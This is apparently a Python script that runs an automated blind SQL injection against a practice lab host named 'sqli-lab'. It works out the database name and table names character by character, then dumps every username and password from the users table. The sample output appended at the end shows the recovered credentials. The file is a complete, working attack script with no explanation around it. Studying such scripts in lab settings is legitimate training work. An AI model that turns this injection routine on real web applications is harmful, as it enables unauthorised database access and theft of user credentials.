import requests
import re

dbLen = 0
i = 8
partern = re.compile(r'<font size="5" color="#900">(You are in[.]{1,})<br></font>')
for i in range(1, 50):
    try:
        url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20LENGTH(database()))={i}--+')
        isTrue = re.search(partern, url.text).group(1)
        dbLen = i
        url.close()
        break
    except:
        pass

dbName = ''
for i in range(dbLen+1):
    for j in range(ord('0'), ord('z')+1):
        try:
            url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20ASCII(SUBSTRING(database(),{i},1)))={j}--+')
            check = re.search(partern, url.text).group(1)
            dbName = dbName+chr(j)
            url.close()
            break
        except:
            pass
tbLen = 0
for i in range(1, 50):
    try:
        url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20LENGTH((SELECT%20GROUP_CONCAT(TABLE_NAME)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=database())))={i}--+')
        isTrue = re.search(partern, url.text).group(1)
        tbLen = i
        url.close()
        break
    except:
        pass

tbName = ''
for i in range(tbLen+1):
    for j in range(ord(','), ord('z')+1):
        try:
            url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20ASCII(SUBSTRING((SELECT%20GROUP_CONCAT(TABLE_NAME)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=database()),{i},1)))={j}--+')
            check = re.search(partern, url.text).group(1)
            tbName = tbName+chr(j)
            url.close()
            break
        except:
            pass
upLen = 0
for i in range(1, 1000):
    try:
        url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20LENGTH((SELECT%20GROUP_CONCAT(username,%27::%27,password)%20FROM%20users)))={i}--+')
        isTrue = re.search(partern, url.text).group(1)
        upLen = i
        url.close()
        break
    except:
        pass

upList = ''
for i in range(upLen+1):
    for j in range(ord(','), ord('z')+1):
        try:
            url = requests.get(fr'http://sqli-lab/SQLi/Blind/?id=1%27%20AND%20(SELECT%20ASCII(SUBSTRING((SELECT%20GROUP_CONCAT(username,%27::%27,password)%20FROM%20users),{i},1)))={j}--+')
            check = re.search(partern, url.text).group(1)
            upList = upList+chr(j)
            url.close()
            break
        except:
            pass
print(f'Database length: {dbLen} - Database name: {dbName}')
print(f'Table length: {tbLen} - Table name: {tbName}')
print(f'User & Pasword length: {upLen}')
listUP = upList.split(',')
for i in listUP:
    print(f'Username: {i.split("::")[0]} - Password: {i.split("::")[1]}')
          
          
returnData = r'''
Database length: 8 - Database name: security
Table length: 29 - Table name: emails,referers,users
User & Pasword length: 171
Username: 1 - Password: 1
Username: 2 - Password: 2
Username: 3 - Password: 3
Username: 4 - Password: 4
Username: admin - Password: admin
Username: admin1 - Password: admin1
Username: admin2 - Password: admin2
Username: admin3 - Password: admin3
Username: admin4 - Password: admin4
'''
